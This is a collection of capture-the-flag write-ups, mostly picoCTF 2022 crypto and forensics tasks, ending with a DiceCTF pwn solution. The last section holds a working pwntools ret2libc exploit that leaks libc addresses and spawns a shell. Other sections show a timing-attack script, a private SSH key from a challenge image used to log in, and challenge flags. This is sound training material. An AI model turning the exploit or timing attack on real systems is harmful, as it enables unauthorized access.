n = 9b38de276b7e997c07bca5117230f669642491b540741badeb3cb8f096f3820149b31154bd674f3e3d7df12c96896bebfb0245d330309af05fc58d3fcfb06523c680334ef7eb9fb1bf2934ebac715b56326de577a2a45b953b6f6e22387be9fc89908a43a65a9133db084c39b18096338cd574614d4bcb5f03827a86f161370aaebdcdc1736289c4f59ab28e9eed74161c3cd9ff7de7c8c2d2845e0c9ebce843a88a3a93a7450bd4b9ab9a123569602f707489f18c3efc63f305de4d2942414c8c76d6ca18b4a8f38227c9b786857612e6fb45daee4db30a94b4cb9328e068fcabd40c0b705b944209e6c866505b1e06cb461da0858eaf7b26a043822c2a93a7
c = 93a10ce3b158c94ff48ef51204562d0ab3ce9ce73d494d059d21449e2cb1259ab7d3bd14126661d13bb4739282c2bf5995a7fa28f82f989f9f77afd28efc1a53d7729970bf7460dfb26f23286ba2e7f10917aed99fe27859c96a4e16c101d1e585f623f761dd28b1eca9be34e49ea851f5a649123283cc7d6c85c83b5a7447f1d910bbe0c5541136ce0370621d6e86e5769c160c5574d814bf2a0153de84e391cd1b538ae17c69f8c175a12bd433fd381f3e1617dfe25604e8f83e5a5fe271082e7315bbb70f992bb9a03cb1f39eac31a379620bb31a7bd22abc0f82baf7250dfdfc8f2533cf1f955e67cba94574a1dc968ba02e2fe995797815784c3d8ab74f
```

Having both the sum and the product we can find p and q using a quadratic equation.

```
n = the product of p and q.
sum = the sum of p and q.

p = x
q = y
xy = n --> 1
x+y = sum --> 2

# Clear y in 2

y = sum - x

# Substituting y in 1

x(sum-x) = n

# Multiply x

xsum - x^2 = n

# We then move all to the right

0 = x^2 - xsum + n

The two results of the equation are p and q.
```
Once i had the equation i made a python script to solve it.

```shell
from sympy import * 
import math
from Crypto.Util.number import long_to_bytes
n = "9b38de276b7e997c07bca5117230f669642491b540741badeb3cb8f096f3820149b31154bd674f3e3d7df12c96896bebfb0245d330309af05fc58d3fcfb06523c680334ef7eb9fb1bf2934ebac715b56326de577a2a45b953b6f6e22387be9fc89908a43a65a9133db084c39b18096338cd574614d4bcb5f03827a86f161370aaebdcdc1736289c4f59ab28e9eed74161c3cd9ff7de7c8c2d2845e0c9ebce843a88a3a93a7450bd4b9ab9a123569602f707489f18c3efc63f305de4d2942414c8c76d6ca18b4a8f38227c9b786857612e6fb45daee4db30a94b4cb9328e068fcabd40c0b705b944209e6c866505b1e06cb461da0858eaf7b26a043822c2a93a7"
sum = "193a4f9d511dfa628e25a42de2e16123a4503c2ba1983dab3402b0f84d2b145116c3d45c4ece5c2ef62e425df830c9cf9b324edd729fdf75f8cb89cfad0d217cc83890c37e1caa39c41588deb59b0aae82291ee407dcb51c80be787ad7f61802c6811830faf12be64a8764e95471c645c5dddc686d7068126f5777c731b125198"
ct = '93a10ce3b158c94ff48ef51204562d0ab3ce9ce73d494d059d21449e2cb1259ab7d3bd14126661d13bb4739282c2bf5995a7fa28f82f989f9f77afd28efc1a53d7729970bf7460dfb26f23286ba2e7f10917aed99fe27859c96a4e16c101d1e585f623f761dd28b1eca9be34e49ea851f5a649123283cc7d6c85c83b5a7447f1d910bbe0c5541136ce0370621d6e86e5769c160c5574d814bf2a0153de84e391cd1b538ae17c69f8c175a12bd433fd381f3e1617dfe25604e8f83e5a5fe271082e7315bbb70f992bb9a03cb1f39eac31a379620bb31a7bd22abc0f82baf7250dfdfc8f2533cf1f955e67cba94574a1dc968ba02e2fe995797815784c3d8ab74f'
sum = int(sum,16)
n = int(n, 16)
e = 65537
ct = int(ct,16)

a = 1
b = sum
c = n

x = Symbol('x')

p = (int(max(solve(a*x**2 + b*x + c, x)))) * -1
q = (int(min(solve(a*x**2 + b*x + c, x)))) * -1
#print(p)
#print(q)

m = math.lcm(p - 1, q - 1)
d = pow(e, -1, m)
pt = pow(ct, d, n)
print(long_to_bytes(pt))
```
**The flag is: picoCTF{24929c45}**



### File: WriteUps/picoCTF2022/Crypto/transposition-trial/README.md

<img src="img/challenge.png">

I started by analyzing the cipher text and see if it has a pattern, i found that from the start of the flag every group of three letters has the first letter in the last position, so i made a python script to fix it.

```python
flag_enc = "heTfl g as iicpCTo{7F4NRP051N5_16_35P3X51N3_V091B0AE}2"

flag = ""
for i in range(12, len(flag_enc),3):
    temp = flag_enc[i:i+3]
    flag += temp[2] + temp[0:2]

print(flag)
```
```shell
❯ python solve.py
picoCTF{7R4N5P051N6_15_3XP3N51V3_109AB02E}
```



### File: WriteUps/picoCTF2022/Crypto/vigenere/README.md

<img src="img/challenge.png">

We have a simple vigenere challenge, i deciphered it using [cryptii](https://cryptii.com/pipes/vigenere-cipher)

**The flag is: picoCTF{D0NT_US3_V1G3N3R3_C1PH3R_d85729g7}**



### File: WriteUps/picoCTF2022/Forensics/Eavesdrop/README.md

<img src="img/challenge.png">

Exploring the tcp streams i found a conversation between two individuals with some interesting data.

<img src="img/1.png">

We know the command to decrypt some file and that it's going to be sent again.

The stream 2 is what appears to be the encrypted file.

<img src="img/2.png">

I saved it as raw because otherwise i would get a bunch of gibberish when i decrypted it.

Once saved i applied the command that was in the chat.

```shell
❯ openssl des3 -d -salt -in file.des3 -out file.txt -k supersecretpassword123
*** WARNING : deprecated key derivation used.
Using -iter or -pbkdf2 would be better.

picoCTF2022/Forensics/Eavesdrop
❯ ls
 capture.flag.pcap   file.des3   file.txt

picoCTF2022/Forensics/Eavesdrop
❯ cat file.txt
picoCTF{nc_73115_411_dd54ab67}
```




### File: WriteUps/picoCTF2022/Forensics/Enhance!/README.md

<img src="img/challenge.png">

I spent some time inspecting the image with different tools until i noticed something when i used cat, the image has some letters between the tspan and /tspan tags
```shell
id="tspan3748">p </tspan><tspan
         sodipodi:role="line"
         x="107.43014"
         y="132.08942"
         style="font-size:0.00352781px;line-height:1.25;fill:#ffffff;stroke-width:0.26458332;"
         id="tspan3754">i </tspan><tspan
         sodipodi:role="line"
         x="107.43014"
         y="132.09383"
         style="font-size:0.00352781px;line-height:1.25;fill:#ffffff;stroke-width:0.26458332;"
         id="tspan3756">c </tspan><tspan
         sodipodi:role="line"
         x="107.43014"
         y="132.09824"
         style="font-size:0.00352781px;line-height:1.25;fill:#ffffff;stroke-width:0.26458332;"
         id="tspan3758">o </tspan><tspan
         sodipodi:role="line"
         x="107.43014"
         y="132.10265"
         style="font-size:0.00352781px;line-height:1.25;fill:#ffffff;stroke-width:0.26458332;"
         id="tspan3760">C </tspan><tspan
         sodipodi:role="line"
         x="107.43014"
         y="132.10706"
         style="font-size:0.00352781px;line-height:1.25;fill:#ffffff;stroke-width:0.26458332;"
         id="tspan3762">T </tspan><tspan
         sodipodi:role="line"
         x="107.43014"
         y="132.11147"
         style="font-size:0.00352781px;line-height:1.25;fill:#ffffff;stroke-width:0.26458332;"
         id="tspan3764">F { 3 n h 4 n </tspan><tspan
         sodipodi:role="line"
         x="107.43014"
         y="132.11588"
         style="font-size:0.00352781px;line-height:1.25;fill:#ffffff;stroke-width:0.26458332;"
         id="tspan3752">c 3 d _ 2 4 3 7 4 6 7 5 }</tspan></text>
  </g>
</svg>
```
I joined them and got the flag.

**The flag is: picoCTF{3nh4nc3d_24374675}**



### File: WriteUps/picoCTF2022/Forensics/File types/README.md

<img src="img/challenge.png">

We are given a pdf, but we can't open it, a quick inspection with the file command reveals its a shell file.

After changing the extension of the file we get a lengthy shell script, but this is just a distraction, we have the interesting part at the ending of the script.
```shell
${echo} "x - extracting flag (text)"
  sed 's/^X//' << 'SHAR_EOF' | uudecode &&
begin 600 flag
M(3QA<F-H/@IF;&%G+R`@("`@("`@("`@,"`@("`@("`@("`@,"`@("`@,"`@
M("`@-C0T("`@("`Q,#(T("`@("`@8`K'<6D`&+RD@0`````!````,&(_-P4`
M``#\`69L86<``$)::#DQ05DF4UG'(\VD```=?___9]]9F_E#_OO_V?OYM_)_
M^]E_-*N=Z_XW__?_F_M=[[`!&QB.@`&@`#0!H`-`R``T`>H:``T-```T```&
M0-`&U!DT,FFTC3U'J>33U3U$`!M0T-`/4`````&@!HS4TT&@--`&@!H-J`VD
M`\H>@C3:F@9/4```:-!Z@JI^J`#(::`T:-!HT`T`::`T`:!D#"`T&@#)B!D#
M0&(:!@@!IB&1H`&@`@"``:QW<`%0^<#-`H'%O"!X""9>>CLAD.(^[PL6/A-B
ME6;]I0QU'(^*<M3A4G020JTX$V:S)<UBPJJ^GA05BX1&=/GP?0Q[D'+!CD+P
MV_K+I4K!/7/[]-KD0PR"2X$3<7S15]YM6_(0H3E!5-0!0@?S%M7+4@%KW"`W
M9TXF\AOG*PC:URG`MOO+*RJ="HSSJ-6/DB)$)!9J4C@F+*0#WWI-'H!8/V/.
MN"&.IB25D82>88[8^:1U<C>D_#Z*'38P5K.XK"R0U$BFCIM2#VV_(5N+2"$,
M^0E%Y%8Z1>T,:6*-JLZ>'\T^3?74((H3*_@S"H1E6[0DKAA*00(S#W`"JC<*
M6:^6M[N<>27G/R`1BRH($\$2[("$7&2->AHJ\X`#>0P,$L`J5,#,*/%1BD1!
MO!RC4\T6>?$ZM`$K_%W)%.%"0QR/-I#'<0`````````````!``````````L`
M`````%1204E,15(A(2$`````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
,````````````````
`
end
```
We can see that is decoding this thing with uudecode, so this is a binary that was transformed to ascii text using [uuencode](https://linux.die.net/man/1/uuencode). I decoded it manually because executing the script failed, so i copied the text and decoded it using uudecode.
```shell
❯ uudecode flag_enc
```
This gives us the following file.
```shell
❯ cat flag
!<arch>
flag/           0           0     0     644     1024      `
�4ښOPh�~�4h��i4dY&SY�ͤg�C���4�7]�4@�4�
                 4Ɉ@!wpP�ż &^z;!��>bf
                                     ur�RtB8f%�ªFt�
                                                   {rB�˥J=s��
                                                             Kq|��[�9AT�B��Rk�7gN&��)�*
�"D$jR8&,�MX?cθ!$a�ur7>60V,�Rm![H!
                                  	E�:E�ibΞ�M�+3
e[$JA3p7
Yy%� 쀄\dz*�y

             *T��DAS�y�+]��C6�
                              TRAILER!!!⏎                                                                                                           
```
We can see that it has **!\<arch\>** at the beginning, this indicates that it's a [.ar](https://linux.die.net/man/1/ar) file, i changed the extension to .ar and extracted the contents. From this point we have to extract different types of compressed files.
```shell
picoCTF2022/Forensics/File types
❯ ar -x flag.ar

picoCTF2022/Forensics/File types
❯ ls
 flag   flag.ar   Flag.pdf   flag.sh   flag_enc

picoCTF2022/Forensics/File types
❯ file flag
flag: cpio archive

picoCTF2022/Forensics/File types
❯ mv flag flag.cpio

picoCTF2022/Forensics/File types
❯ cpio -idv < flag.cpio
flag
2 blocks

picoCTF2022/Forensics/File types
❯ ls
 flag   flag.ar   flag.cpio   Flag.pdf   flag.sh   flag_enc

picoCTF2022/Forensics/File types
❯ file flag
flag: bzip2 compressed data, block size = 900k

picoCTF2022/Forensics/File types
❯ mv flag flag.bz2

picoCTF2022/Forensics/File types
❯ bzip2 -d flag.bz2

picoCTF2022/Forensics/File types
❯ ls
 flag   flag.ar   flag.cpio   Flag.pdf   flag.sh   flag_enc

picoCTF2022/Forensics/File types
❯ file flag
flag: gzip compressed data, was "flag", last modified: Tue Mar 15 06:50:39 2022, from Unix, original size modulo 2^32 328

picoCTF2022/Forensics/File types
❯ mv flag flag.gz

picoCTF2022/Forensics/File types
❯ gzip -d flag.gz

picoCTF2022/Forensics/File types
❯ file flag
flag: lzip compressed data, version: 1

picoCTF2022/Forensics/File types
❯ mv flag flag.lzip

picoCTF2022/Forensics/File types
❯ lzip -d flag.lzip

picoCTF2022/Forensics/File types
❯ ls
 flag.ar   flag.cpio   flag.lzip.out   Flag.pdf   flag.sh   flag_enc

picoCTF2022/Forensics/File types
❯ file flag.lzip.out
flag.lzip.out: LZ4 compressed data (v1.4+)

picoCTF2022/Forensics/File types
❯ mv flag.lzip.out flag.lzip

picoCTF2022/Forensics/File types
❯ lzip -d flag.lzip
lzip: flag.lzip: Bad magic number (file not in lzip format).
lzip: Deleting output file 'flag.lzip.out', if it exists.

picoCTF2022/Forensics/File types
❯ ls
 flag.ar   flag.cpio   flag.lzip   Flag.pdf   flag.sh   flag_enc

picoCTF2022/Forensics/File types
❯ file flag.lzip
flag.lzip: LZ4 compressed data (v1.4+)

picoCTF2022/Forensics/File types
❯ mv flag.lzip flag.lz4

picoCTF2022/Forensics/File types
❯ lz4 -d flag.lz4
Decoding file flag
flag.lz4             : decoded 266 bytes

picoCTF2022/Forensics/File types
❯ ls
 flag   flag.ar   flag.cpio   flag.lz4   Flag.pdf   flag.sh   flag_enc

picoCTF2022/Forensics/File types
❯ file flag
flag: LZMA compressed data, non-streamed, size 254

picoCTF2022/Forensics/File types
❯ mv flag flag.lzma

picoCTF2022/Forensics/File types
❯ lzma -d flag.lzma

picoCTF2022/Forensics/File types
❯ ls
 flag   flag.ar   flag.cpio   flag.lz4   Flag.pdf   flag.sh   flag_enc

picoCTF2022/Forensics/File types
❯ file flag
flag: lzop compressed data - version 1.040, LZO1X-1, os: Unix

picoCTF2022/Forensics/File types
❯ mv flag flag.lzo

picoCTF2022/Forensics/File types
❯ lzop -d flag.lzo

picoCTF2022/Forensics/File types
❯ ls
 flag   flag.ar   flag.cpio   flag.lz4   flag.lzo   Flag.pdf   flag.sh   flag_enc

picoCTF2022/Forensics/File types
❯ file flag
flag: lzip compressed data, version: 1

picoCTF2022/Forensics/File types
❯ mv flag flag.lzip

picoCTF2022/Forensics/File types
❯ lzip -d flag.lzip

picoCTF2022/Forensics/File types
❯ ls
 flag.ar   flag.cpio   flag.lz4   flag.lzip.out   flag.lzo   Flag.pdf   flag.sh   flag_enc

picoCTF2022/Forensics/File types
❯ file flag.lzip.out
flag.lzip.out: XZ compressed data, checksum CRC64

picoCTF2022/Forensics/File types
❯ mv flag.lzip.out flag.xz

picoCTF2022/Forensics/File types
❯ unxz flag.xz

picoCTF2022/Forensics/File types
❯ ls
 flag   flag.ar   flag.cpio   flag.lz4   flag.lzo   Flag.pdf   flag.sh   flag_enc

picoCTF2022/Forensics/File types
❯ file flag
flag: ASCII text

picoCTF2022/Forensics/File types
❯ cat flag
7069636f4354467b66316c656e406d335f6d406e3170756c407431306e5f
6630725f3062326375723137795f37396230316332367d0a
```
The flag is in hexadecimal, i transformed it to string using [cyberchef](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')&input=NzA2OTYzNmY0MzU0NDY3YjY2MzE2YzY1NmU0MDZkMzM1ZjZkNDA2ZTMxNzA3NTZjNDA3NDMxMzA2ZTVmCjY2MzA3MjVmMzA2MjMyNjM3NTcyMzEzNzc5NWYzNzM5NjIzMDMxNjMzMjM2N2QwYQ).

**The flag is: picoCTF{f1len@m3_m@n1pul@t10n_f0r_0b2cur17y_79b01c26}**



### File: WriteUps/picoCTF2022/Forensics/Lookey here/README.md

<img src="img/challenge.png">

I used grep on the text and found the flag.
```shell
❯ grep -i "pico" anthem.flag.txt
      we think that the men of picoCTF{gr3p_15_@w3s0m3_58f5c024}
```



### File: WriteUps/picoCTF2022/Forensics/Operation Oni/README.md

<img src="img/challenge.png">

We have a .img file, so the first thing i did was to mount it.
```shell
┌──(kali㉿kali)-[~/Documents]
└─$ fdisk -l disk.img       
Disk disk.img: 230 MiB, 241172480 bytes, 471040 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0x0b0051d0

Device     Boot  Start    End Sectors  Size Id Type
disk.img1  *      2048 206847  204800  100M 83 Linux
disk.img2       206848 471039  264192  129M 83 Linux
┌──(root㉿kali)-[/home/kali/Documents]
└─# mount -o loop,offset=105906176 disk.img /mnt/  
```
After that i went to the root folder and saw the files.
```shell
┌──(root㉿kali)-[/home/kali/Documents]
└─# cd /mnt      
                                                                                        
┌──(root㉿kali)-[/mnt]
└─# ls
bin   dev  home  lost+found  mnt  proc  run   srv  tmp  var
boot  etc  lib   media       opt  root  sbin  sys  usr
                                                                                        
┌──(root㉿kali)-[/mnt]
└─# cd root 
                                                                                        
┌──(root㉿kali)-[/mnt/root]
└─# ls
                                                                                        
┌──(root㉿kali)-[/mnt/root]
└─# ls -la
total 4
drwx------  3 root root 1024 Oct  6 10:30 .
drwxr-xr-x 21 root root 1024 Oct  6 10:28 ..
-rw-------  1 root root   36 Oct  6 10:31 .ash_history
drwx------  2 root root 1024 Oct  6 10:30 .ssh
                                                                                        
┌──(root㉿kali)-[/mnt/root]
└─# cat .ash_history 
ssh-keygen -t ed25519
ls .ssh/
halt
```
As we can see a ssh key was generated and possibly is in the .ssh/ directory, so i changed to that directory.
```shell
┌──(root㉿kali)-[/mnt/root]
└─# cd .ssh 
                                                                                        
┌──(root㉿kali)-[/mnt/root/.ssh]
└─# ls    
id_ed25519  id_ed25519.pub
                                                                                        
┌──(root㉿kali)-[/mnt/root/.ssh]
└─# ls -la 
total 4
drwx------ 2 root root 1024 Oct  6 10:30 .
drwx------ 3 root root 1024 Oct  6 10:30 ..
-rw------- 1 root root  411 Oct  6 10:30 id_ed25519
-rw-r--r-- 1 root root   96 Oct  6 10:30 id_ed25519.pub
                                                                                        
┌──(root㉿kali)-[/mnt/root/.ssh]
└─# cat id_ed25519  
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACBgrXe4bKNhOzkCLWOmk4zDMimW9RVZngX51Y8h3BmKLAAAAJgxpYKDMaWC
gwAAAAtzc2gtZWQyNTUxOQAAACBgrXe4bKNhOzkCLWOmk4zDMimW9RVZngX51Y8h3BmKLA
AAAECItu0F8DIjWxTp+KeMDvX1lQwYtUvP2SfSVOfMOChxYGCtd7hso2E7OQItY6aTjMMy
KZb1FVmeBfnVjyHcGYosAAAADnJvb3RAbG9jYWxob3N0AQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----
                                                                                        
┌──(root㉿kali)-[/mnt/root/.ssh]
└─# cat id_ed25519.pub 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGCtd7hso2E7OQItY6aTjMMyKZb1FVmeBfnVjyHcGYos root@localhost
```
We have both the public and private key, the last step is connecting to the server we where given when we initialized the instance with the private key.
```shell
┌──(root㉿kali)-[/mnt/root/.ssh]
└─# ssh -i id_ed25519 -p 53188 ctf-player@saturn.picoctf.net 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.13.0-1017-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

ctf-player@challenge:~$ ls
flag.txt
ctf-player@challenge:~$ cat flag.txt 
picoCTF{k3y_5l3u7h_d6e19567}ctf-player@challenge:~$ Connection to saturn.picoctf.net closed by remote host.
Connection to saturn.picoctf.net closed.
```






### File: WriteUps/picoCTF2022/Forensics/Operation Orchid/README.md

<img src="img/challenge.png">
We have a .img file , the first thing i did was to mount it.


```shell
┌──(kali㉿kali)-[~]
└─$ fdisk -l disk.flag.img
Disk disk.flag.img: 400 MiB, 419430400 bytes, 819200 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0xb11a86e3

Device         Boot  Start    End Sectors  Size Id Type
disk.flag.img1 *      2048 206847  204800  100M 83 Linux
disk.flag.img2      206848 411647  204800  100M 82 Linux swap / Solaris
disk.flag.img3      411648 819199  407552  199M 83 Linux
                                                                                        
┌──(kali㉿kali)-[~]
└─$ sudo mount -o loop,offset=210763776 disk.flag.img /mnt/
```
Then i entered the root folder and saw the files inside.

```shell
┌──(root㉿kali)-[/mnt/root]
└─# ls -la
total 4
drwx------  2 root root 1024 Oct  6 14:32 .
drwxr-xr-x 22 root root 1024 Oct  6 14:30 ..
-rw-------  1 root root  202 Oct  6 14:33 .ash_history
-rw-r--r--  1 root root   64 Oct  6 14:32 flag.txt.enc
```
I saw the insides of .ash_history

```shell
┌──(root㉿kali)-[/mnt/root]
└─# cat .ash_history 
touch flag.txt
nano flag.txt 
apk get nano
apk --help
apk add nano
nano flag.txt 
openssl
openssl aes256 -salt -in flag.txt -out flag.txt.enc -k unbreakablepassword1234567
shred -u flag.txt
ls -al
halt
```
As we can see the flag is encrypted using ssl, we need to decrypt it.
```shell
┌──(root㉿kali)-[/mnt/root]
└─# cat flag.txt.enc 
Salted__O金�Oez�2>@����SSgk(r�]}�}�f�z�Ȥ7� ���؎$�'%                                                                                        
┌──(root㉿kali)-[/mnt/root]
└─# openssl aes256 -d -salt -in flag.txt.enc -out flag -k unbreakablepassword1234567 
*** WARNING : deprecated key derivation used.
Using -iter or -pbkdf2 would be better.
bad decrypt
140015604639104:error:06065064:digital envelope routines:EVP_DecryptFinal_ex:bad decrypt:../crypto/evp/evp_enc.c:610:
                                                                                        
┌──(root㉿kali)-[/mnt/root]
└─# ls    
flag  flag.txt.enc
                                                                                        
┌──(root㉿kali)-[/mnt/root]
└─# cat flag        
picoCTF{h4un71ng_p457_5113beab}
```




### File: WriteUps/picoCTF2022/Forensics/Packets Primer/README.md

<img src="img/challenge.png">

I followed the TCP stream and found the flag in the stream 0.

<img src="img/flag.png">

I removed the spaces using python
```python
❯ python
Python 3.10.2 (main, Jan 15 2022, 19:56:27) [GCC 11.1.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> "p i c o C T F { p 4 c k 3 7 _ 5 h 4 r k _ b 9 d 5 3 7 6 5 }".replace(" ","")
'picoCTF{p4ck37_5h4rk_b9d53765}'
```



### File: WriteUps/picoCTF2022/Forensics/Redaction gone wrong/README.md

<img src="img/challenge.png">

We can still select some parts of the redacted text, in particular the last redacted part is the flag.

**The flag is: picoCTF{C4n_Y0u_S33_m3_fully}**



### File: WriteUps/picoCTF2022/Forensics/SideChannel/README.md

<img src="img/challenge.png">

We are given a binary file that asks for the correct pin. One the hints suggests us to read about [timing attacks](https://en.wikipedia.org/wiki/Timing_attack) and i did.

What the program is doing is comparing each character of the correct pin and the user input, the moment a character is wrong the program stops, which allows this kind of attack.

```
So for example if pin = 12345678 
we can guess the right numbers by checking the time it takes 
for the program to run 
0000000 -- took 10ns the character is wrong and stopped.
1000000 -- took 100ns compared the character and its right.
1100000 -- took 100ns compared the first character but stopped at the second.
1200000 -- took 200ns compared both characters and found they are right.

The time increases for each right character.
```

I wrote a shell script to generate each number and to show the time it took to execute the program, but i  couldn't make it completely automatic so i still had to add the right number to the program. 

```shell
#!/bin/bash
for i in {0..9}
do
  pin="${i}0000000"
  echo $pin
  time ./pin_checker <<< $pin
done
```
Once the execution was finished i checked for the iteration with the highest user time value and added that number to the pin variable, after doing that 8 times i ended up with this pin **48390513**.

```shell
❯ nc saturn.picoctf.net 52680
Verifying that you are a human...
Please enter the master PIN code:
48390513
Password correct. Here's your flag:
picoCTF{t1m1ng_4tt4ck_eb4d7efb}
```




### File: WriteUps/picoCTF2022/Forensics/Sleuthkit Apprentice/README.md

<img src="img/challenge.png">

The first thing i did was trying to mount the image
```shell                                                                         
┌──(root㉿kali)-[/home/kali/Downloads]
└─# fdisk -l disk.flag.img 
Disk disk.flag.img: 300 MiB, 314572800 bytes, 614400 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0x7389e82d

Device         Boot  Start    End Sectors  Size Id Type
disk.flag.img1 *      2048 206847  204800  100M 83 Linux
disk.flag.img2      206848 360447  153600   75M 82 Linux swap / Solaris
disk.flag.img3      360448 614399  253952  124M 83 Linux
                                                                           
┌──(root㉿kali)-[/home/kali/Downloads]
└─# mount -o loop,offset=184549376 disk.flag.img /mnt/
```
I mounted it at **offset=184549376** because we have a sector of 512 bytes and the part that interests us starts at 360448 (512 * 360448 = 184549376).

After analyzing most of the directories i entered the **root** directory which has a folder inside called **my_folder**,
this folder has a file called **flag.uni.txt**, printing its contents reveals the flag.

```shell
──(root㉿kali)-[/mnt]
└─# cd root
                                                                           
┌──(root㉿kali)-[/mnt/root]
└─# ls
my_folder
                                                                           
┌──(root㉿kali)-[/mnt/root]
└─# cd my_folder
                                                                           
┌──(root㉿kali)-[/mnt/root/my_folder]
└─# ls
flag.txt  flag.uni.txt
                                                                           
┌──(root㉿kali)-[/mnt/root/my_folder]
└─# cat flag.uni.txt
picoCTF{by73_5urf3r_adac6cb4}
```




### File: WriteUps/picoCTF2022/Forensics/Sleuthkit intro/README.md

<img src="img/challenge.png">

```shell
picoCTF2022/Forensics/Sleuthkit intro took 6s 
❯ mmls disk.img
DOS Partition Table
Offset Sector: 0
Units are in 512-byte sectors

      Slot      Start        End          Length       Description
000:  Meta      0000000000   0000000000   0000000001   Primary Table (#0)
001:  -------   0000000000   0000002047   0000002048   Unallocated
002:  000:000   0000002048   0000204799   0000202752   Linux (0x83)

picoCTF2022/Forensics/Sleuthkit intro 
❯ nc saturn.picoctf.net 52279
What is the size of the Linux partition in the given disk image?
Length in sectors: 202752
202752
Great work!
picoCTF{mm15_f7w!}
```



### File: WriteUps/picoCTF2022/Forensics/St3g0/README.md

<img src="img/challenge.png">

We get the following image:

<img src="img/pico.flag.png">

Since is a png i used zsteg to inspect it and got the flag.

```shell
picoCTF2022/Forensics/st3g0 
❯ zsteg pico.flag.png
b1,rgb,lsb,xy       .. text: "picoCTF{7h3r3_15_n0_5p00n_a1062667}$t3g0"
b1,abgr,lsb,xy      .. text: "E2A5q4E%uSA"
b2,b,lsb,xy         .. text: "AAPAAQTAAA"
b2,b,msb,xy         .. text: "HWUUUUUU"
```



### File: WriteUps/DiceCTF-2022/Pwn/interview-opportunity.md

# interview-opportunity

---

We are provided with two files.

```
interview-opportunity
libc.so.6
```

---

First we need to check the protections of the binary in order to determine which
vulnerabilities the binary has.

```fish
$ checksec --file=interview-opportunity

RELRO           STACK CANARY      NX            PIE   
Partial RELRO   No canary found   NX enabled    No PIE
```
The binary doesn't has stack canary, so it can be vulnerable to buffer overflow.
Since we are provided with a libc file, it is probable that the vulnerability is
a ret2libc exploit.

---

```py
from pwn import *

e = ELF('./interview-opportunity')
libc = ELF('./libc.so.6')

context.binary = e
context.arch = 'amd64'
context.terminal = 'kitty'

# p = process('./interview-opportunity', env={'LD_PRELOAD':'libc.s0.6'})

# p = gdb.debug("./interview-opportunity", env={'LD_PRELOAD':'libc.so.6'}, gdbscript='''
#         b *main
#         continue
# ''')

p = remote('mc.ax', 31081)

gadget = 0x401313
main = e.symbols['main']
puts = e.symbols['puts']
puts_got = e.got['puts']
puts_off = libc.symbols['puts']
binsh_off = next(libc.search(b'/bin/sh'))

log.info('Puts got adr: ' + hex(puts_got))
log.info('Puts libc off: ' + hex(puts_off))
log.info('Binsh libc off: ' + hex(binsh_off))

payload = b"a" * 34
payload += p64(main)

p.sendlineafter("So tell us. Why should you join DiceGang?", payload)

payload = b"a" * 34
payload += p64(gadget)
payload += p64(puts_got)
payload += p64(puts)
payload += p64(main)

p.sendlineafter("So tell us. Why should you join DiceGang?", payload)

p.recvline()
p.recvline()
p.recvline()

libc_off = u64(p.recvline(keepends = False).ljust(8, b'\x00')) - puts_off

log.info('Libc base adr: ' + hex(libc_off))
log.info('System adr: ' + hex(libc_off + libc.symbols["system"]))
log.info('Binsh adr: ' + hex(libc_off + binsh_off))

payload = b"a" * 34
payload += p64(gadget)
payload += p64(libc_off + binsh_off)
payload += p64(libc_off + libc.symbols["system"])

p.sendlineafter("So tell us. Why should you join DiceGang?", payload)

p.interactive()
```

